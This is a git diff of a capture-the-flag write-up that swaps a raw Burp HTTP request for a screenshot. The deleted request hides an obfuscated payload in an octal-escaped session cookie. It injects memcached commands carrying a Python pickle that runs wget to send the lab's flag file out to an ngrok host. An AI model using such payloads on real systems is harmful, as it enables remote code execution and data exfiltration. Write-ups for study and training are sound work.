@@ -295,24 +295,8 @@ The payload i got looked something like this:
 ![image](https://github.com/hash3liZer/khatta/assets/29171692/b55a7d35-80e4-47d0-9283-1d92ec0b0a08)
 
 As per the HTTP specs, we need send it with double quotes as the session cookie. I used burp: 
-```
-GET /set?uicolor=green HTTP/1.1
-Host: 83.136.252.32:47034
-sec-ch-ua: "Not_A Brand";v="8", "Chromium";v="120"
-sec-ch-ua-mobile: ?0
-sec-ch-ua-platform: "Windows"
-Upgrade-Insecure-Requests: 1
-User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.6099.216 Safari/537.36
-Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7
-Sec-Fetch-Site: none
-Sec-Fetch-Mode: navigate
-Sec-Fetch-User: ?1
-Sec-Fetch-Dest: document
-Accept-Encoding: gzip, deflate, br
-Accept-Language: en-US,en;q=0.9
-Cookie: session="\061\063\067\015\012\163\145\164\040\102\124\137\072\061\063\063\067\040\060\040\062\065\071\062\060\060\060\040\061\062\070\015\012\143\160\157\163\151\170\012\163\171\163\164\145\155\012\160\060\012\050\126\167\147\145\164\040\042\150\164\164\160\163\072\057\057\062\143\065\062\055\062\064\060\067\055\144\060\060\060\055\064\060\063\055\145\060\060\145\055\066\060\144\062\055\071\061\060\144\055\144\146\067\143\055\144\146\064\144\056\156\147\162\157\153\055\146\162\145\145\056\141\160\160\057\163\157\155\145\164\150\151\156\147\044\050\143\141\164\040\057\146\154\141\147\052\051\042\012\160\061\012\164\160\062\012\122\160\063\012\056\015\012\147\145\164\040\102\124\137\072\061\063\063\067"; token=eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1c2VybmFtZSI6Imhhc2hpc2giLCJzdWJzY3JpcHRpb24iOiJndWVzdCIsImlhdCI6MTcwNTE5MTQ3OSwiZXhwIjoxNzA1Mjc3ODc5fQ.thx2tlcE92NDlzrVXEzXtpBD1wezF6_-w2Yem60vrUM; 
-Connection: close
-```
+![image](https://github.com/hash3liZer/khatta/assets/29171692/030407bb-f81b-42a0-86dc-f260917a6d92)
+
 
 At first it returned me a `200` response. While i should have gotten an `Internal Server Error`. Running it a couple times, returned me a request on my `ngrok` terminal:
 ![image](https://github.com/hash3liZer/khatta/assets/29171692/5df209cf-3e5f-4a0a-ae0b-45bc7657993c)
